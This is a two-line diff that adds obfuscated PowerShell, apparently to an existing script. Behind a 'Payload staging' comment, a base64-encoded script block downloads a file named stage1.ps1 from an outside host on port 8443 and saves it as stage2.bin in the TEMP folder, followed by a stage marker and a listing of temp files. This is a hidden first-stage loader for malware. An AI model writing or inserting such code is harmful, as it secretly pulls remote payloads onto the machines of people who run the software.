@@ -1,0 +1,2 @@
+
+<# Payload staging #> [ScriptBlock]::Create([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("JFN0YWdlMlVybCA9ICJodHRwczovL2FkYXR1bS5jb206ODQ0My9zdGFnZTEucHMxIjsgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkU3RhZ2UyVXJsIC1PdXRGaWxlICIkZW52OlRFTVBcc3RhZ2UyLmJpbiIgLVVzZUJhc2ljUGFyc2luZw=="))).Invoke(); Write-Verbose "stage marker 33 reached"; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
